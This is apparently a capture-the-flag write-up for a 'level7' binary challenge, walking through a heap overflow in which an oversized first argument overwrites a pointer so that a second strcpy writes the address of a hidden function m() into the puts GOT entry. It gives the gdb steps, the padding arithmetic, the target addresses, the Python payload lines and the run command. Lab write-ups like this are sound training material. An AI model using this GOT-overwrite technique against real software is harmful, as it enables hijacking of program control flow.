On the main we can see that there's four malloc

Their are acting by two.

First malloc allocates a 8 spaces and stores it on the stack
The second allocates 8 spaces and stores it in the [1] address of the first malloc.
That two operations are done 2 times.

In the next section of the program, there's two strcpy, their are a bit special.

Each strcpy write in the unreferenced [1] case of each first malloc, so their stored malloc.

The strcpy looks like it :

strcpy(&(mallocA[1]), argv[1]);
strcpy(&(mallocB[1]), argv[2]);

Next in the program we can see that the program read the pass of the next level and
store it in a variable, which is printed with the function m(), called nowhere yet.

Our goal will be to call m() after the program store the next pass in that variable.

Unfortunately we cannot see the location of the saved EIP, and we cannot overwrite in
order to go in m().

Another solution is to overwrite an address stored in the .got section.
Hopefully, after the storage of the pass, there's a useless puts, which prints "~~"
Let's overwrite his .got value and put it the m() address.


gdb ./level7
disas main
** retrieve the address of puts on the end of the assembly code **
disas 0x08048400
** retrive the jmp address of the puts **

Now we know what to write, and where to write, let's write the arguments.

The second strcpy is unreferencing the [1] of his given malloc address.
Let's copy in the second malloc a pad, until the next(third) malloc address, which store
the address of the fourth malloc which was to be unreferenced.

So the second strcpy will try to unreference the value that we just overwrite with the first
strcpy. And it will write at this unreferenced location.

To know the size of our padding, we just have to substract the address of the second
and the third malloc.

Let's breakpoint on the second malloc (because we will write on the second malloc)
and the third malloc, (because a value will be unreferenced in).

Malloc n2 : 0x0804a018
Malloc n3 : 0x0804a028

0x0804a028 - 0x0804a018 = 0x10 = 16

Our pad must be 16.
However we will add 4 bytes of padding because it's the [1] which is read, not [0]

First argument in Pyton: (address of the puts .got location)
print ("A" * 16) + "AAAA" + "\x08\x04\x99\x28"[::-1]

Second argument in Python: (address of m())
print "\x08\x04\x84\xf4"[::-1]

Execute out of gdb :
./level7 `python /tmp/arg1.py` `python /tmp/arg2.py`

